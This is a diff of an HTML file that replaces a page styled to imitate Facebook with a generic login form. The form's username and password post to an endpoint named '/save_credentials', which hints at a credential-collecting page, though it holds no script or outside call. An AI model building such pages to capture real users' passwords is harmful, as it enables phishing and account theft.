@@ -3,32 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Interface</title>
+    <title>Login Page</title>
     <style>
-        /* Some basic styling to mimic a Facebook-like interface */
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
+            line-height: 1.6;
             padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
         }
-        .container {
-            background-color: #ffffff;
-            border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        h2 {
+            text-align: center;
+            color: #333;
         }
-        h1 {
-            color: #1877f2;
+        label {
+            display: block;
+            margin-bottom: 10px;
         }
-        p {
-            color: #1c1e21;
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Welcome to Facebook</h1>
-        <p>This is a simplified version of the Facebook interface.</p>
-    </div>
+    <h2>Login to Your Portal</h2>
+    <form action="/save_credentials" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+
+        <input type="submit" value="Login">
+    </form>
 </body>
 </html>
